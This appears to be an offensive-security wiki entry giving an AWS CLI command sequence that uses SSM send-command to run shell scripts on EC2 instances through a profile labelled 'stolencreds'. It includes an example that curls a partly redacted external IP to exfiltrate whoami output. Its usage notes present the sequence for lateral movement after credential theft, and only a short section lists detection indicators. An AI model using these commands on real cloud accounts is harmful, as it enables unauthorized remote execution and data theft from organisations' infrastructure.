---
id: a2e5170d-60b5-401f-a549-c421a4348314
name: aws-ssm-shell-script-execution-sequence
type: code
language: bash
verified: true
created_at: '2023-04-06T03:56:09.691221Z'
updated_at: '2023-04-10T20:20:49.941179Z'
platforms:
  - AWS
  - Linux
tags:
  - aws
  - ssm
  - execution
validated: true
---

# aws-ssm-shell-script-execution-sequence

## Code

```bash
$ aws ssm describe-instance-information --profile stolencreds --region eu-west-1  
$ aws ssm send-command --instance-ids "INSTANCE-ID-HERE" --document-name "AWS-RunShellScript" --comment "IP Config" --parameters commands=ifconfig --output text --query "Command.CommandId" --profile stolencreds
$ aws ssm list-command-invocations --command-id "COMMAND-ID-HERE" --details --query "CommandInvocations[].CommandPlugins[].{Status:Status,Output:Output}" --profile stolencreds

e.g:
$ aws ssm send-command --instance-ids "i-05b████████adaa" --document-name "AWS-RunShellScript" --comment "whoami" --parameters commands='curl 162.243.███.███:8080/`whoami`' --output text --region=us-east-1
```

## Description

This bash code sequence demonstrates the full workflow for executing shell scripts on AWS EC2 instances using SSM: discovering instances, sending commands, and retrieving outputs. It can be adapted into a script for automated lateral movement or reconnaissance in compromised AWS environments.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| $_PROFILE | AWS CLI profile name with SSM permissions | stolencreds |
| $_REGION | AWS region for operations | eu-west-1 |
| $_INSTANCE_ID | Target EC2 instance ID | i-05b████████adaa |
| $_COMMAND_ID | ID returned from send-command | 12345678-1234-1234-1234-123456789012 |
| $_SHELL_SCRIPT | Commands to execute (e.g., ifconfig or curl payload) | curl 162.243.███.███:8080/`whoami` |

## Usage

Save as a .sh file and run in a terminal with AWS CLI configured. First, identify instances, then send a command (e.g., for exfiltration via curl to an attacker server), and finally check results. Use in procedures like [[procedures/aws-ssm-command-execution-ec2-shell-script]] after credential theft to execute payloads remotely.

## Detection

- CloudTrail logs showing ssm:SendCommand with unusual parameters or from unknown IPs.
- GuardDuty alerts for anomalous SSM API calls or command contents (e.g., curl to external domains).
- Instance logs (CloudWatch) revealing executed scripts or network connections to suspicious hosts.
- IAM access logs for unauthorized profile usage.

## Related

- [[procedures/aws-ssm-command-execution-ec2-shell-script]]
- [[commands/aws-ssm-send-shell-script-command]]
